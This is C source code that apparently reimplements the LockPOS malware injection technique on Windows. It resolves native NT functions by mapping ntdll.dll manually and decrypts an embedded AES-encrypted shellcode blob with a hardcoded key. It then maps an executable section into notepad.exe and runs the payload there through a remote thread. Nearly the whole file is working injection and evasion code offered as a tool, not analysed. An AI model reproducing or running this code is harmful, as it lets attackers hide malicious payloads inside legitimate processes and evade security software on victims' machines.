/*https://www.cyberbit.com/endpoint-security/new-lockpos-malware-injection-technique/*/
/*CreateFileMappingW, MapViewOfFile, RtlAllocateHeap, NtCreateSection(0x004a), NtMapViewOfSection(0x0028), NtCreateThreadEx(0x004e)*/
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "lockpos.h"
#include <ntstatus.h>
#include <stdint.h>
#include <string.h>

#define AES_BLOCK_SIZE 16
#define INITIAL_HASH 0xABCD1234  // Początkowy wektor
#define MIX_CONSTANT 0x9E3779B9  // Stała mieszająca

typedef BOOL (*pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);

typedef struct _SYSCALL_ENTRY {
    char* FunctionName;
    DWORD SyscallNumber;
} SYSCALL_ENTRY;


BYTE shellcode[] = {0xde, 0xc9, 0x43, 0x4d, 0x03, 0x0a, 0xe8, 0x8d, 0x19, 0x61, 0x2b, 0xf4, 
    0x62, 0x95, 0x15, 0x26, 0xe1, 0x2a, 0x65, 0xd3, 0xeb, 0x9e, 0x1a, 0x0d, 
    0xb6, 0xa3, 0xc9, 0xc4, 0x1f, 0x67, 0xab, 0xd0, 0x49, 0x99, 0x8b, 0x0f, 
    0x80, 0x66, 0xba, 0x1f, 0xa3, 0x54, 0xd9, 0x38, 0x71, 0x47, 0x95, 0x60, 
    0xa1, 0xb3, 0xde, 0xa4, 0xbd, 0xb9, 0x1f, 0x94, 0x78, 0x57, 0x9d, 0x90, 
    0x28, 0xab, 0x2b, 0x45, 0xef, 0x2d, 0x65, 0xf9, 0x6e, 0x67, 0x82, 0x85, 
    0x48, 0xc6, 0xd7, 0x6c, 0x5d, 0xb9, 0xf3, 0x19, 0x21, 0xd7, 0x01, 0x2f, 
    0xb8, 0xac, 0xeb, 0x84, 0xa7, 0xae, 0xc4, 0x2d, 0x78, 0x76, 0x7d, 0x01, 
    0x5c, 0x97, 0x6e, 0x48, 0xa8, 0x29, 0x31, 0x98, 0x6a, 0xa1, 0x24, 0xf4, 
    0x98, 0xe9, 0x93, 0x2e, 0xe2, 0x7f, 0x49, 0x70, 0x28, 0x78, 0x65, 0xad, 
    0xb9, 0x33, 0x27, 0xb1, 0x8d, 0x83, 0x68, 0x28, 0xa7, 0x24, 0x60, 0xc9, 
    0xa5, 0x49, 0x82, 0xcc, 0xbf, 0x49, 0x62, 0x3a, 0x19, 0xa9, 0x62, 0x1d, 
    0xff, 0xed, 0x79, 0xc3, 0xd8, 0x8f, 0x0f, 0x6d, 0x00, 0x5a, 0x99, 0xac, 
    0x5b, 0x2a, 0x3b, 0xda, 0x09, 0x89, 0x00, 0x50, 0x6c, 0x8c, 0xe4, 0x71, 
    0x99, 0xf7, 0x55, 0x86, 0x89, 0x9c, 0x48, 0xfc, 0x47, 0xdb, 0x33, 0x31, 
    0xcb, 0x21, 0x72, 0xcb, 0xa0, 0xf4, 0x34, 0xf9, 0x60, 0x66, 0xbb, 0xd3, 
    0x80, 0x99, 0x69, 0x0e, 0x63, 0x82, 0xcd, 0x42, 0x53, 0x0f, 0x56, 0x63, 
    0x3b, 0xe4, 0xdb, 0x94, 0xd1, 0xa4, 0x85, 0xd2, 0x5f, 0xb2, 0x03, 0x5a, 
    0x89, 0x81, 0xd1, 0x0b, 0x0b, 0x09, 0x1b, 0x25, 0xc7, 0xff, 0x1a, 0x67, 
    0x1d, 0x3b, 0x5d, 0xf8, 0xee, 0x3d, 0x52, 0xfe, 0xf4, 0xb4, 0x05, 0x79, 
    0xa8, 0x50, 0xc8, 0xed, 0x90, 0xaf, 0x5f, 0xb3, 0x09, 0x26, 0x49, 0x58, 
    0x1f, 0x4f, 0xd7, 0xda, 0x9c, 0xe6, 0xf6, 0xc4, 0x6b, 0x75, 0xb9, 0xb4, 
    0xf5, 0xc5, 0x37, 0x51, 0x8e, 0x37, 0x14, 0x79, 0x45, 0xc5, 0x43, 0xd9, 
    0x46, 0xe6, 0xfa, 0xfb, 0x73, 0x42, 0xa7, 0x5a, 0xb4, 0xb0, 0xb4, 0x00};

    SIZE_T shellcodesize = sizeof(shellcode);

    void decryptData(const BYTE* encryptedData, SIZE_T encryptedSize, BYTE* outputData, SIZE_T* outputSize, const char* aesKey) {
        HCRYPTPROV hCryptProv = 0;
        HCRYPTKEY hKey = 0;
        HCRYPTHASH hHash = 0;
    
        //Acquiring a cryptographic provider context
        if (!CryptAcquireContextA(&hCryptProv, NULL, MS_ENH_RSA_AES_PROV_A, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            printf("[-] CryptAcquireContext failed, error: %d\n", GetLastError());
            return;
        }
    
        //Creating a hash object
        if (!CryptCreateHash(hCryptProv, CALG_SHA_256, 0, 0, &hHash)) {
            printf("[-] CryptCreateHash failed, error: %d\n", GetLastError());
            CryptReleaseContext(hCryptProv, 0);
            return;
        }
    
        //Hashing the AES key
        if (!CryptHashData(hHash, (BYTE*)aesKey, (DWORD)strlen(aesKey), 0)) {
            printf("[-] CryptHashData failed, error: %d\n", GetLastError());
            CryptDestroyHash(hHash);
            CryptReleaseContext(hCryptProv, 0);
            return;
        }
    
        //Deriving an AES key from the hash
        if (!CryptDeriveKey(hCryptProv, CALG_AES_128, hHash, 0, &hKey)) {
            printf("[-] CryptDeriveKey failed, error: %d\n", GetLastError());
            CryptDestroyHash(hHash);
            CryptReleaseContext(hCryptProv, 0);
            return;
        }
    
        CryptDestroyHash(hHash); // No longer needed
    
        //Copying encrypted data to output buffer
        memcpy(outputData, encryptedData, encryptedSize);
        DWORD dataSize = (DWORD)encryptedSize;
    
        //Perform decryption
        if (!CryptDecrypt(hKey, 0, TRUE, 0, outputData, &dataSize)) {
            printf("[-] CryptDecrypt failed, error: %d\n", GetLastError());
            CryptDestroyKey(hKey);
            CryptReleaseContext(hCryptProv, 0);
            return;
        }
    
        *outputSize = dataSize; // Update the actual decrypted size
    
        // Cleanup
        CryptDestroyKey(hKey);
        CryptReleaseContext(hCryptProv, 0);
    }
int main(void){

    NTSTATUS status;
    PVOID HAllocate = NULL;
    PROCESS_INFORMATION pi;
    STARTUPINFO si = {sizeof(si)};
    unsigned long oldProtection = 0;

//creating handle for ntdll
    HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE){
        printf("[-] failed to create(open) file, error: [%d]\n", GetLastError());
        return 1;
    }
        printf("[+] Opening ntdll.dll\n");


//creating a mapping object for the ntdll        
    HANDLE FileMapd = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, L"mydll");
    if(FileMapd == NULL){
        printf("[-] unable to creating mapping object, error: [%d]\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
        printf("[+] creating the mapping object\n");


//mapping the ntdll to address in our process (this program)
    LPVOID FileView = MapViewOfFile(FileMapd, FILE_MAP_READ, 0, 0, 0);
    if(FileView == NULL){
        printf("[-] failed to mapping file, error: [%d]\n", GetLastError());
        CloseHandle(hFile);
        CloseHandle(FileMapd);
        return 1;
    }
        printf("[+] file has been mapped to [0x%p]\n", FileView);
        
/*next couple blocks of code are steps for manually loading function from ntdll.dll, (PE manual loading technique)*/
    IMAGE_DOS_HEADER *dos_header = (IMAGE_DOS_HEADER *)FileView;
    IMAGE_NT_HEADERS *nt_headers = (IMAGE_NT_HEADERS *)((BYTE *)FileView + dos_header->e_lfanew);
    //printf("dos_header and nt_headers addresses: [%p, %p]\n", dos_header, nt_headers);
    
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY *)((PBYTE)FileView + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    //printf("export table addres: [%p]\n", exportDir);
    
    DWORD *addressOfFunctions = (DWORD *)((PBYTE)FileView + exportDir->AddressOfFunctions);
    DWORD *addressOfNames = (DWORD *)((PBYTE)FileView + exportDir->AddressOfNames);
    WORD *addressOfNameOrdinals = (WORD *)((PBYTE)FileView + exportDir->AddressOfNameOrdinals);
    //printf("test [%p, %p, %p]\n", addressOfFunctions, addressOfNames, addressOfNameOrdinals);//for debuging purpose
    

//looking for required function addresses by names
    //char *functionNames[] = {"0x70F8084F", "0x6AA462C9", "0x0AEF06C2", "0x2C8B305F" , "0xE878E8F6"};
    char *functionNames[] = {"NtCreateSection", "NtCreateThreadEx", "NtMapViewOfSection", "NtProtectVirtualMemory", "NtWaitForSingleObject", "NtWriteVirtualMemory", "RtlAllocateHeap"};
    
    void *function_addresses[6] = {0};
    
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* functionName = (char*)((PBYTE)FileView + addressOfNames[i]);
        for (int j = 0; j < sizeof(functionNames) / sizeof(functionNames[0]); j++) {
            if (strcmp(functionName, functionNames[j]) == 0) {
                DWORD functionOrdinal = addressOfNameOrdinals[i];
                DWORD functionAddress = addressOfFunctions[functionOrdinal];
                PBYTE functionPtr = (PBYTE)FileView + functionAddress;
                function_addresses[j] = functionPtr;
                // Looking for syscall number in first 16 bytes of function 
                DWORD syscallNumber = 0;
                for (int k = 0; k < 16; k++) {
                    if (functionPtr[k] == 0xB8) {  // mov eax, XXh
                        syscallNumber = *(DWORD*)(functionPtr + k + 1);
                        break;
                    }
                }
                printf("Function [%s] found at address: [0x%p] with syscall number [%d], [%d]\n",
                       functionNames[j], functionPtr, syscallNumber, j);
            }
        }
    }
/*---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/
//creating snapshot
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    if(snapshot == INVALID_HANDLE_VALUE){
        printf("[-] creating snapshot failed, error: [%d]\n", GetLastError());
        return 1;
    }
        printf("[+] Creating snapshot\n");


//looking for target process "notepad.exe"
    PROCESSENTRY32W hEntry;
    hEntry.dwSize = sizeof(PROCESSENTRY32W);
    THREADENTRY32 hTEntry; 
    hTEntry.dwSize = sizeof(THREADENTRY32);

    if (Process32FirstW(snapshot, &hEntry)) {
        do {
            if (_wcsicmp(hEntry.szExeFile, L"notepad.exe") == 0) {
                wprintf(L"[+] Target process: [%d]\n", hEntry.th32ProcessID);
                break;  
            }
        } while (Process32NextW(snapshot, &hEntry)); // Uniknięcie nieskończonej pętli
    } else {
        wprintf(L"[-] Getting processes list failed, error: [%d]\n", GetLastError());
        CloseHandle(snapshot);
    }


    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, TRUE, hEntry.th32ProcessID);
    if(!hProcess){
        printf("[-] Opening proces failed: [%d]\n", hEntry.th32ProcessID);
        return 1;
    }
    printf("[+] Opening the target process [%d]\n", hEntry.th32ProcessID);

//creating the section object in the kernel 
    HANDLE hSection = NULL;
    LARGE_INTEGER maxSize;
    maxSize.QuadPart = 0x1000; 
    pNtCreateSection NtCreateSection = (pNtCreateSection)function_addresses[0];
    status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to create section. NTSTATUS: 0x%X\n", status);
        CloseHandle(FileMapd);
        CloseHandle(hFile);
		return 1;
	}
    printf("[+] Section created \n");

//map a view of that section into selected process
    PVOID cSection = NULL;
    DWORD viewSize = 0;
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)function_addresses[2];
    status = NtMapViewOfSection(hSection, hProcess, &cSection, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to map section. NTSTATUS: 0x%X\n", status);
        CloseHandle(FileMapd);
        CloseHandle(hFile);
        return 1;
    }
    printf("[+] Section mapped at address: %p\n", cSection);

    BYTE decryptedData[512] = { 0 }; // Buffer for decryption
    SIZE_T decryptedSize = sizeof(decryptedData);
    const char* encryptionKey = "ThisIsASecretKey";
    decryptData(shellcode, shellcodesize, decryptedData, &decryptedSize, encryptionKey);


//copying code into section
    ULONG bytesWritten = 0;
    PVOID baseAddress = cSection;  //must be pointer
    SIZE_T regionSize = shellcodesize;  //size of written region
    pNtWriteVirtualMemory NtWriteVirtualMemory= (pNtWriteVirtualMemory)function_addresses[5];
    status = NtWriteVirtualMemory(hProcess, cSection, decryptedData, shellcodesize, &bytesWritten);
    if(!NT_SUCCESS(status)){
        printf("[-] unable to write shellocde into process memory, error: [%d]\n", GetLastError());
        CloseHandle(hProcess);
        CloseHandle(FileMapd);
        CloseHandle(hFile);
        return 1;
    }
    printf("[+] Writting shellcode into process [%d]\n", bytesWritten);


// Change Memory Protection: RW -> RX
    _NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)function_addresses[3];
    status = pNtProtectVirtualMemory(hProcess, &cSection, &bytesWritten, PAGE_EXECUTE_READ, &oldProtection);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to change memory protection from RW to RX: %x \n", status);
		exit(-1);
	}

//creating a remote thread
    HANDLE hThread = NULL;
    PVOID remoteShellcode = (LPTHREAD_START_ROUTINE)cSection;
    _NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)function_addresses[1];
    //for proper operation requires the PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION acces rights in Open_Process function
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteShellcode, NULL, FALSE, 0, 0, 0, NULL);                   
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed to Execute Remote Thread: 0x%X\n", status);
        exit(-1);
    }

    printf("[+] Injected shellcode!!\n");


    //NtClose(hSection);
    UnmapViewOfFile(FileView);
    CloseHandle(hProcess);
    CloseHandle(FileMapd);
    CloseHandle(hFile);
    CloseHandle(hSection);

    return 0;
}
